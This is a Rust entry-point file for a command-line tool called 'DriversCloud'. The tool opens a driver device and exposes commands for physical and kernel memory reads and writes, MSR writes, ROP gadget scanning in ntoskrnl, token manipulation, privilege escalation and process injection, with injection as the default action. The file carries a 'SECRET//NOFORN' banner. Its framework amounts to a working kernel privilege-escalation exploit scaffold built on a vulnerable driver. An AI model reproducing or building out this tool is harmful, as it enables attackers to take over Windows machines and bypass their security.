/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

#![allow(non_snake_case, dead_code)]

mod commands;
mod device;
mod eprocess;
mod gadgets;
mod kernel_rw;
mod utils;

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};

use crate::commands::kread::{cmd_kdump, cmd_kread, cmd_kwrite};
use crate::commands::misc::{
    cmd_eprocess, cmd_find_kbase, cmd_lookup_export, cmd_procid, cmd_proclinks, cmd_scan_gadgets,
    cmd_token,
};
use crate::commands::borrow::cmd_inject;
use crate::commands::r#priv::{cmd_priv, cmd_privn};
use crate::device::{msr_read, msr_write, phys_read_result, Device, DEVICE_PATH, MSR_LSTAR};
use crate::utils::{find_mod, get_kernel_modules, hexdump, parse_hex_or_dec};

#[derive(Parser)]
#[command(name = "DriversCloud", about = "DriversCloud driver client")]
struct Cli {
    #[command(subcommand)]
    cmd: Option<Cmd>,
}

#[derive(Subcommand)]
enum Cmd {
    #[command(name = "r-mem")]
    RMem {
        addr: String,
        len: String,
        #[arg(long)]
        raw: bool,
    },

    #[command(name = "rdmsr")]
    Rdmsr {
        msr: String,
    },

    #[command(name = "kbase")]
    FindKbase,

    #[command(name = "wrmsr")]
    Wrmsr {
        msr: String,
        value: String,
    },

    #[command(name = "rop")]
    ScanGadgets,

    #[command(name = "lookup")]
    LookupExport {
        symbol: String,
    },

    #[command(name = "kread")]
    KRead {
        addr: String,
    },

    #[command(name = "kdump")]
    KDump {
        addr: String,
        #[arg(default_value = "16")]
        count: u64,
    },

    #[command(name = "kwrite")]
    KWrite {
        target: String,
        value: String,
    },

    #[command(name = "sysentry")]
    SysEntry,

    #[command(name = "eprocess")]
    EProcess,

    #[command(name = "procid")]
    ProcId,

    #[command(name = "proclinks")]
    ProcLinks,

    #[command(name = "token")]
    Token,

    #[command(name = "priv")]
    Priv {
        target: String,
    },

    #[command(name = "inject")]
    Inject {
        pid: Option<String>,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    let dev = Device::open(DEVICE_PATH)
        .context("failed to open DriversCloud device")?;

    match cli.cmd.unwrap_or(Cmd::Inject { pid: None }) {
        Cmd::RMem { addr, len, raw } => {
            let pa = parse_hex_or_dec(&addr)?;
            let count = parse_hex_or_dec(&len)? as u32;
            let data = phys_read_result(&dev, pa, count)?;
            if raw {
                use std::io::Write;
                std::io::stdout().write_all(&data)?;
            } else {
                println!("[+] read {} bytes from PA=0x{:X}", data.len(), pa);
                hexdump(&data, pa);
            }
        }

        Cmd::Rdmsr { msr } => {
            let idx = parse_hex_or_dec(&msr)? as u32;
            let val = msr_read(&dev, idx)?;
            println!("MSR 0x{:08X} = 0x{:016X}", idx, val);
        }

        Cmd::FindKbase => {
            cmd_find_kbase(&dev)?;
        }

        Cmd::Wrmsr { msr, value } => {
            let idx = parse_hex_or_dec(&msr)? as u32;
            let val = parse_hex_or_dec(&value)?;
            msr_write(&dev, idx, val)?;
            println!("[+] wrmsr MSR=0x{:08X} value=0x{:016X}", idx, val);
        }

        Cmd::ScanGadgets => {
            let mods = get_kernel_modules()?;
            let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
                .context("ntoskrnl not found in module list")?;
            println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
            println!("  [i] size=0x{:X}", nt.size);
            cmd_scan_gadgets(&mods, nt.va)?;
        }

        Cmd::LookupExport { symbol } => {
            cmd_lookup_export(&symbol)?;
        }

        Cmd::SysEntry => {
            let lstar = msr_read(&dev, MSR_LSTAR)?;
            println!("[+] IA32_LSTAR (0xC0000082) = 0x{:016X}", lstar);
        }

        Cmd::EProcess => {
            cmd_eprocess(&dev)?;
        }

        Cmd::ProcId => {
            cmd_procid(&dev)?;
        }

        Cmd::ProcLinks => {
            cmd_proclinks(&dev)?;
        }

        Cmd::Token => {
            cmd_token(&dev)?;
        }

        Cmd::KRead { addr } => {
            let va = parse_hex_or_dec(&addr)?;
            cmd_kread(&dev, va)?;
        }

        Cmd::KDump { addr, count } => {
            let va = parse_hex_or_dec(&addr)?;
            cmd_kdump(&dev, va, count)?;
        }

        Cmd::KWrite { target, value } => {
            let target_va = parse_hex_or_dec(&target)?;
            let val = parse_hex_or_dec(&value)?;
            cmd_kwrite(&dev, target_va, val)?;
        }

        Cmd::Priv { target } => {
            match parse_hex_or_dec(&target) {
                Ok(pid) => cmd_priv(&dev, pid)?,
                Err(_) => cmd_privn(&dev, &target)?,
            }
        }

        Cmd::Inject { pid } => {
            let target_pid = match pid {
                Some(s) => Some(parse_hex_or_dec(&s)?),
                None    => None,
            };
            cmd_inject(&dev, target_pid)?;
        }
    }

    Ok(())
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/
